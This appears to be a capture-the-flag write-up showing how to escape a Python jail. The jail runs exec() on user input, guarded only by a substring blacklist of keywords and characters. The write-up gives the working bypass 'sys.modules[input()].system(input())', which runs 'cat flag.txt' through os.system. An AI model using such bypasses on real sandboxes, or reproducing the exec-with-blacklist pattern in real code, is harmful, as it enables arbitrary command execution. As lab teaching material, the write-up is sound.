# Blacklist Hell

**Category:** Pwn / Jailbreak

---

## Challenge Description

A restrictive Python jail with a comprehensive blacklist. You have only 2 attempts to execute Python code and must find a way to read the flag file.

**Connection:**
```
nc blacklisthell.challenges2.ctf.dscjssstuniv.in 1338
```

**Source Code:**
```python
#!/usr/bin/env python3
import sys
blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile",
             "globals","os","import","breakpoint","lambda","eval","read","print",
             "open","'","=",'"',"x","builtins","clear"]
print("="*25)
print(open(__file__).read())
print("="*25)
print("Welcome to the jail!")
print("="*25)

for i in range(2):
    sys.stdout.write('Enter command: ')
    sys.stdout.flush()
    x = sys.stdin.readline().strip()
    for c in blacklist:
        if c in x:
            print("Blacklisted word found! Exiting!")
            exit(0)
    exec(x)
```

---

## Analysis

### Blacklist Breakdown

The blacklist includes:

| Category | Blocked Items |
|----------|---------------|
| **Digits** | `0-9` (prevents numeric literals) |
| **Quotes** | `'` and `"` (prevents string literals) |
| **Equals** | `=` (prevents variable assignment) |
| **Slash** | `/` (prevents path manipulation) |
| **Keywords** | `os`, `builtins`, `x`, `clear`, `setattr`, `globals`, `breakpoint`, `lambda`, `read`, `import`, `eval`, `open`, `print`, `compile` |

### Critical Insight

The blacklist uses simple substring checking: `if c in x:`. This checks if any blacklisted string appears anywhere in the command as a contiguous substring.

**Key Observation:** The string "modules" does NOT contain "os" as a substring!
- "modules" = `m o d u l e s`
- "os" requires consecutive 'o' followed by 's'
- In "modules", 'o' is at position 1 and 's' is at position 6 — not consecutive

### Failed Approaches

| Attempt | Reason for Failure |
|---------|-------------------|
| `__import__('os').system('cat flag.txt')` | Contains quotes and `import` |
| `eval(input())` | `eval` is blacklisted |
| `getattr(__builtins__, 'exec')(input())` | Contains `builtins` |
| `getattr(__builtins__, chr(101)+chr(102))(input())` | Contains `builtins` |

---

## Solution

### The Bypass

```python
sys.modules[input()].system(input())
```

**Why this works:**

1. **No blacklisted substrings:**
   - "modules" does NOT contain "os" as a substring
   - No quotes, digits, equals, or other blacklisted words

2. **Leverages already loaded modules:**
   - `sys.modules` is a dictionary of all imported modules
   - `os` is already loaded in the environment

3. **Uses `input()` for string injection:**
   - First `input()` provides "os" → `sys.modules['os']` returns os module
   - Second `input()` provides command → `os.system('cat flag.txt')`

### Exploitation Steps

```
Enter command: sys.modules[input()].system(input())
os
cat flag.txt
DSCCTF{bl4ckl1st_byp4ss_w1th_h3x_4nd_chr_m4st3ry_2026}
```

### Execution Flow

1. Command: `sys.modules[input()].system(input())`
2. First input: `os`
3. Second input: `cat flag.txt`
4. Result: Executes `os.system('cat flag.txt')` → prints flag

---

## Key Takeaways

- Always check what's already imported — `sys.modules` is valuable
- Understand substring vs. token matching — simple `in` checks are weak
- `input()` is powerful — it bypasses string literal restrictions
- Inspect the environment with `help()`, `dir()`, `vars()` to explore
- Think about module access paths — not just `import`, but `sys.modules`